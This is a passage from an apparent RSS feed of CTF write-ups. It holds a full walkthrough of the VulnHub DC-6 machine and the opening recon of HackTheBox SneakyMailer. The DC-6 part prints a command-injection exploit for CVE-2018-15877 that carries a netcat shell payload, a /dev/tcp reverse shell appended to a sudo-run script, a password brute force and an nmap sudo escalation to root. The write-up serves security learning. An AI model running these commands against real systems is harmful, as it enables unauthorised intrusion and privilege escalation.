+      <content:encoded><![CDATA[<p>DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and <code>nmap</code> which allows me to escalate to other users then straight to root.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>WordPress enumeration and plugin exploitation</li>
+<li>Exploiting sudo privileges on nmap</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Arpscan</li>
+<li>WPScan</li>
+<li>BurpSuite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="host-discovery---arpscan">Host Discovery - arpscan</h3>
+<p>Because <code>192.168.2.1</code> and <code>192.168.2.2</code> are virtual gateway addresses, the target machine&rsquo;s IP address is most likely <code>192.168.2.104</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ arp-scan --interface eth0 <span style="color:#e6db74">&#39;192.168.2.0/24&#39;</span> | tee scans/00-arp-scan-dc6
+Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
+Starting arp-scan 1.9.7 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+192.168.2.1     08:00:27:e8:e9:78       PCS Systemtechnik GmbH
+192.168.2.2     0a:00:27:00:00:07       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
+192.168.2.104   08:00:27:ac:db:5f       PCS Systemtechnik GmbH
+</code></pre></div><h3 id="nmap">Nmap</h3>
+<p>With initial scan, <code>nmap</code> shows two ports open: SSH on port 22 and Apache Web Server on port 80.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ nmap -n -sC -sV -oA scans/10-initial-dc6 <span style="color:#e6db74">&#39;192.168.2.104&#39;</span> -v
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+|_http-title: Did not follow redirect to http://wordy/
+|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+MAC Address: 08:00:27:AC:DB:5F <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second</span>
+</code></pre></div><p>From the results above, there&rsquo;s a redirection to <code>http://wordy/</code> on port 80. To properly resolve the web, I&rsquo;ll add wordy to my <code>/etc/hosts</code> file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">192.168.1.104   wordy
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>This page clearly states that it&rsquo;s a WordPress site.</p>
+<p><div class="img-container"><img src="imgs/image-20210419191210177.png" alt="image-20210419191210177"  /></div>
+</p>
+<p>Nothing interesting to explore, but the text <code>secure plugins</code> seems to be a hint from the machine&rsquo;s author.</p>
+<p>I ran a <code>gobuster</code> scan but found nothing useful.</p>
+<h4 id="nmap-nse">Nmap NSE</h4>
+<p><code>nmap</code> script scan found some usernames.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ nmap -p <span style="color:#ae81ff">80</span> --script <span style="color:#e6db74">&#34;http-wordpress*&#34;</span> wordy
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-11 23:13 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> wordy <span style="color:#f92672">(</span>192.168.2.104<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.00069s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE
+80/tcp open  http
+...
+|   /: WordPress version: 5.1.1
+...
+| http-wordpress-users: 
+| Username found: admin
+| Username found: graham
+| Username found: mark
+| Username found: sarah
+| Username found: jens
+|_Search stopped at ID <span style="color:#75715e">#25. Increase the upper limit if necessary with &#39;http-wordpress-users.limit&#39;</span>
+MAC Address: 08:00:27:AC:DB:5F <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.48 seconds
+</code></pre></div><h4 id="wpscan">WPScan</h4>
+<p><code>wpscan</code> identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive
+...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> plainview-activity-monitor
+ | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
+ | Last Updated: 2018-08-26T15:08:00.000Z
+ | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is <span style="color:#ae81ff">20180826</span>
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Directory listing is enabled
+ |
+ | Found By: Known Locations <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: <span style="color:#ae81ff">200</span>
+ |
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> vulnerability identified:
+ |
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Title: Plainview Activity Monitor &lt;<span style="color:#f92672">=</span> <span style="color:#ae81ff">20161228</span> - Remote Command Execution <span style="color:#f92672">(</span>RCE<span style="color:#f92672">)</span>
+ |     Fixed in: <span style="color:#ae81ff">20180826</span>
+ |     References:
+ |      - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2018-15877
+ |      - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor
+ |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/
+ |
+ | Version: <span style="color:#ae81ff">20161228</span> <span style="color:#f92672">(</span>50% confidence<span style="color:#f92672">)</span>
+ | Found By: Readme - ChangeLog Section <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> user-role-editor
+ | Location: http://wordy/wp-content/plugins/user-role-editor/
+ | Last Updated: 2021-04-05T02:38:00.000Z
+ | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is 4.59
+ |
+ | Found By: Known Locations <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  - http://wordy/wp-content/plugins/user-role-editor/, status: <span style="color:#ae81ff">200</span>
+ |
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> vulnerability identified:
+ |
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Title: User Role Editor &lt;<span style="color:#f92672">=</span> 4.24 - Privilege Escalation
+ |     Fixed in: 4.25
+ |     References:
+ |      - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c
+ |      - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/
+ |
+ | Version: 4.24 <span style="color:#f92672">(</span>80% confidence<span style="color:#f92672">)</span>
+ | Found By: Readme - Stable Tag <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  - http://wordy/wp-content/plugins/user-role-editor/readme.txt
+...
+</code></pre></div><p>I&rsquo;m interested with the RCE one, but before that I&rsquo;ll have to find creds.</p>
+<h4 id="brute-forcing-passwords">Brute-forcing passwords</h4>
+<p>At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn&rsquo;t know that the box&rsquo;s author actually gave us a hint to create a custom wordlist from <code>rokyou.txt</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210419183629054.png" alt="image-20210419183629054"  /></div>
+</p>
+<p>I&rsquo;ll create new wordlist from <code>rockyou.txt</code> and then use it to perform a brute force using <code>wpscan</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt
+→ root@iamf «dc-6» «192.168.43.234» 
+$ wpscan --url http://wordy/ --usernames users --passwords passwords.txt 
+</code></pre></div><p>It returns one valid credentials: <code>mark:helpdesk10</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210419184715108.png" alt="image-20210419184715108"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="wp-dashboard">WP Dashboard</h4>
+<p>With the credentials I obtained, I can login into the admin panel.</p>
+<p><div class="img-container"><img src="imgs/image-20210531002724008.png" alt="image-20210531002724008"  /></div>
+</p>
+<h4 id="plainview-activity-monitor---rce--cve-2018-15877">Plainview Activity Monitor - RCE  (CVE-2018-15877)</h4>
+<p>From the previous <code>wpscan</code>, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from <a href="https://www.exploit-db.com/exploits/45274">exploit-db</a>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+  <span style="color:#75715e">&lt;!--  Wordpress Plainview Activity Monitor RCE
+</span><span style="color:#75715e">        [+] Version: 20161228 and possibly prior
+</span><span style="color:#75715e">        [+] Description: Combine OS Commanding and CSRF to get reverse shell
+</span><span style="color:#75715e">        [+] Author: LydA(c)ric LEFEBVRE
+</span><span style="color:#75715e">        [+] CVE-ID: CVE-2018-15877
+</span><span style="color:#75715e">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell
+</span><span style="color:#75715e">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
+</span><span style="color:#75715e">  --&gt;</span>
+  &lt;<span style="color:#f92672">body</span>&gt;
+  &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">pushState</span>(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
+      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ip&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&#34;</span> /&gt;
+      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lookup&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Lookup&#34;</span> /&gt;
+      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit request&#34;</span> /&gt;
+    &lt;/<span style="color:#f92672">form</span>&gt;
+  &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>The vulnerability comes from this IP tools feature.</p>
+<p><div class="img-container"><img src="imgs/image-20210419194814055.png" alt="image-20210419194814055"  /></div>
+</p>
+<p>I&rsquo;ll hit the lookup button and intercept the request on Burp.</p>
+<p>RCE can be achieved by adding a set of malicious OS commands after the command pipe <code>|</code>, semi colon <code>;</code> (stacked command), or logical OR <code>||</code> at the <code>ip</code> section. In this case, I send a reverse shell.</p>
+<p>Here is with command pipe.</p>
+<p><div class="img-container"><img src="imgs/image-20210419194314291.png" alt="image-20210419194314291"  /></div>
+</p>
+<p>And this one by stacking commands with semicolon.</p>
+<p><div class="img-container"><img src="imgs/image-20210419200042885.png" alt="image-20210419200042885"  /></div>
+</p>
+<p>I can not find the plugin&rsquo;s source code, my best guess it can be something like this.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">...</span>
+$ip <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ip&#39;</span>]
+$do_something <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;dig </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#f92672">...</span>
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-graham">Shell as graham</h3>
+<h4 id="internal-enumeration">Internal enumeration</h4>
+<p>The home directory is readable by <code>www-data</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ find /home 2&gt;/dev/null
+find /home 2&gt;/dev/null
+...
+/home/jens/backups.sh
+....
+/home/mark/stuff/things-to-do.txt
+....
+</code></pre></div><p>I immediately checked the contents of <code>backups.sh</code> and <code>things-to-do.txt</code>.</p>
+<p>The <code>backups.sh</code> script is writable by group <code>devs</code>, and I&rsquo;ll note that.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh
+ls -l /home/jens/backups.sh
+-rwxrwxr-x <span style="color:#ae81ff">1</span> jens devs <span style="color:#ae81ff">50</span> Apr <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> /home/jens/backups.sh
+www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
+cat /home/jens/backups.sh
+<span style="color:#75715e">#!/bin/bash</span>
+tar -czf backups.tar.gz /var/www/html
+</code></pre></div><p>And this <code>things-to-do.txt</code> contains graham&rsquo;s credentials.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
+cat /home/mark/stuff/things-to-do.txt
+Things to do:
+
+- Restore full functionality for the hyperdrive (need to speak to Jens)
+- Buy present for Sarah&#39;s farewell party
+- Add new user: graham - GSo7isUM1D4 - done
+- Apply for the OSCP course
+- Buy new laptop for Sarah&#39;s replacement
+</code></pre></div><h4 id="ssh---graham">SSH - graham</h4>
+<p>I tried the graham&rsquo;s creds, <code>graham:GSo7isUM1D4</code>, on SSH, and it worked.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «dc-6» «192.168.43.234» 
+$ ssh graham@192.168.2.104
+graham@192.168.2.104&#39;s password: 
+Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+graham@dc-6:~$ id
+uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
+</code></pre></div><h3 id="shell-as-jens">Shell as jens</h3>
+<h4 id="sudo-privileges---backupssh">Sudo privileges - backups.sh</h4>
+<p>User <code>graham</code> has sudo privileges on the <code>backups.sh</code> script, and this allows me to run the script as user <code>jens</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">graham@dc-6:~$ sudo -l
+Matching Defaults entries for graham on dc-6:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User graham may run the following commands on dc-6:
+    (jens) NOPASSWD: /home/jens/backups.sh
+graham@dc-6:~$ cat /home/jens/backups.sh
+#!/bin/bash
+tar -czf backups.tar.gz /var/www/html
+graham@dc-6:~$ ls -l /home/jens/backups.sh
+-rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh
+</code></pre></div><p>Because the script is also writable by graham (<code>devs</code> group), I can exploit this to escalate myself to <code>jens</code> by adding a reverse shell line to the script and then run it with sudo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">graham@dc-6:~$ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/192.168.2.108/9000 0&gt;&amp;1&#39;</span> &gt;&gt; /home/jens/backups.sh
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204321872.png" alt="image-20210419204321872"  /></div>
+</p>
+<h3 id="shell-as--root">Shell as  root</h3>
+<h4 id="sudo-privileges---nmap">Sudo privileges - nmap</h4>
+<p>I found out that user <code>jens</code> is allowed to execute <code>nmap</code> as root user.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ sudo -l
+sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> jens on dc-6:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+
+User jens may run the following commands on dc-6:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/nmap
+</code></pre></div><p>I&rsquo;ll also exploit this using reference from <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>
+jens@dc-6:/home/graham$ echo <span style="color:#e6db74">&#39;os.execute(&#34;/bin/sh&#34;)&#39;</span> &gt; $TF
+jens@dc-6:/home/graham$ sudo nmap --script<span style="color:#f92672">=</span>$TF
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204616406.png" alt="image-20210419204616406"  /></div>
+</p>
+<p>And here is the flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@dc-6:~# cat theflag.txt 
+
+
+Yb        dP 888888 88     88         8888b.   dP&#34;Yb  88b 88 888888 d8b 
+ Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
+  YbdPYbdP   88&#34;&#34;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&#34;&#34;   `&#34;&#39; 
+   YP  YP    888888 88ood8 88ood8     8888Y&#34;   YbodP  88  Y8 888888 (8) 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - SneakyMailer</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</link>
+      <pubDate>Wed, 28 Apr 2021 21:28:30 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</guid>
+      <description>SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users&#39; mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run pip3 with sudo privileges, and this can be leveraged to obtain root access.</description>
+      <content:encoded><![CDATA[<p>SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run <code>pip3</code> with sudo privileges, and this can be leveraged to obtain root access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Phishing</li>
+<li>PyPI Package Exploitation</li>
+<li>Exploiting sudo privileges on pip3</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
+$ mkdir nmap; nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v
+
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">2048</span> 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+25/tcp   open  smtp     Postfix smtpd
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
+80/tcp   open  http     nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Did not follow redirect to http://sneakycorp.htb
+143/tcp  open  imap     Courier Imapd <span style="color:#f92672">(</span>released 2018<span style="color:#f92672">)</span>
+|_imap-capabilities: ENABLE STARTTLS UTF8<span style="color:#f92672">=</span>ACCEPTA0001 CHILDREN ACL ACL2<span style="color:#f92672">=</span>UNION THREAD<span style="color:#f92672">=</span>ORDEREDSUBJECT THREAD<span style="color:#f92672">=</span>REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost/organizationName<span style="color:#f92672">=</span>Courier Mail Server/stateOrProvinceName<span style="color:#f92672">=</span>NY/countryName<span style="color:#f92672">=</span>US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+993/tcp  open  ssl/imap Courier Imapd <span style="color:#f92672">(</span>released 2018<span style="color:#f92672">)</span>
+|_imap-capabilities: ENABLE AUTH<span style="color:#f92672">=</span>PLAIN CHILDREN ACL ACL2<span style="color:#f92672">=</span>UNION THREAD<span style="color:#f92672">=</span>ORDEREDSUBJECT THREAD<span style="color:#f92672">=</span>REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY UTF8<span style="color:#f92672">=</span>ACCEPTA0001 NAMESPACE
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost/organizationName<span style="color:#f92672">=</span>Courier Mail Server/stateOrProvinceName<span style="color:#f92672">=</span>NY/countryName<span style="color:#f92672">=</span>US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+8080/tcp open  http     nginx 1.14.2
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome to nginx!
+Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>With an initial scan, <code>nmap</code> discovered seven ports open and also identified the services behind them.</p>
+<p>I’ll summarize the result:</p>
+<ul>
+<li>There is an FTP service on port 21, but <code>nmap</code> shows no sign that anonymous login is allowed.</li>
+<li>An SSH service on port 22</li>
+<li>Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993</li>
+<li>And a web server hosting two sites on port 80 and 8080. <code>nmap</code> identifies the hostname as <code>sneakycorp.htb</code>.</li>
+</ul>
+<p>I’ll add <code>sneakycorp.htb</code> to my <code>/etc/hosts</code> file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
+$ echo <span style="color:#e6db74">&#39;10.10.10.197 sneakycorp.htb&#39;</span> &gt;&gt; /etc/hosts 
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting <code>sneakycorp.htb</code> on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as &ldquo;Complete!&rdquo; while the other one seems still in progress for about 80%.</p>
+<p><img src="imgs/7f7b01dbdf744b97b9ccc3c260288ee1.png" alt="7f7b01dbdf744b97b9ccc3c260288ee1" style="zoom:67%;" /></p>
+<p>Clicking on the &ldquo;Team&rdquo; menu points to<code>/team.php</code>. This page shows a table contains the employees' data of SneakyCorp.</p>
